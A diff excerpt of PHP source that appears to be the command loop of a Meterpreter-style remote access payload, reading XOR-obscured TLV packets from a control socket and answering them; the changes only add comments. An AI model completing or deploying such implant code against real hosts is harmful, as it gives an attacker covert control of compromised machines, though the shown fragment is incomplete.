@@ -1504,20 +1483,20 @@ if (!isset($GLOBALS['msgsock'])) {
     register_socket($msgsock);
     break;
   case 'stream':
-    
+    # fall through
   default:
   register_stream($msgsock);
   }
 }
 add_reader($msgsock);
 
-
-
-
+#
+# Main dispatch loop
+#
 $r=$GLOBALS['readers'];
 $w=NULL;$e=NULL;$t=1;
 while (false !== ($cnt = select($r, $w, $e, $t))) {
-  
+  #my_print(sprintf("Returned from select with %s readers", count($r)));
   $read_failed = false;
   for ($i = 0; $i < $cnt; $i++) {
     $ready = $r[$i];
@@ -1526,17 +1505,17 @@ while (false !== ($cnt = select($r, $w, $e, $t))) {
       my_print(sprintf("Read returned %s bytes", strlen($packet)));
       if (false==$packet) {
         my_print("Read failed on main socket, bailing");
-        
-        
+        # We failed on the main socket.  There's no way to continue, so
+        # break all the way out.
         break 2;
       }
       $xor = substr($packet, 0, 4);
       $header = xor_bytes($xor, substr($packet, 4, 28));
       $len_array = unpack("Nlen", substr($header, 20, 4));
-      
-      
+      # length of the packet should be the packet header size
+      # minus 8 for the tlv length + the required data length
       $len = $len_array['len'] + 32 - 8;
-      
+      # packet type should always be 0, i.e. PACKET_TYPE_REQUEST
       while (strlen($packet) < $len) {
         $packet .= read($msgsock, $len-strlen($packet));
       }
@@ -1544,7 +1523,7 @@ while (false !== ($cnt = select($r, $w, $e, $t))) {
 
       write_tlv_to_socket($msgsock, $response);
     } else {
-      
+      #my_print("not Msgsock: $ready");
       $data = read($ready);
       if (false === $data) {
         handle_dead_resource_channel($ready);
@@ -1557,9 +1536,9 @@ while (false !== ($cnt = select($r, $w, $e, $t))) {
       }
     }
   }
-  
+  # $r is modified by select, so reset it
   $r = $GLOBALS['readers'];
-} 
+} # end main loop
 my_print("Finished");
 my_print("--------------------");
 close($msgsock);
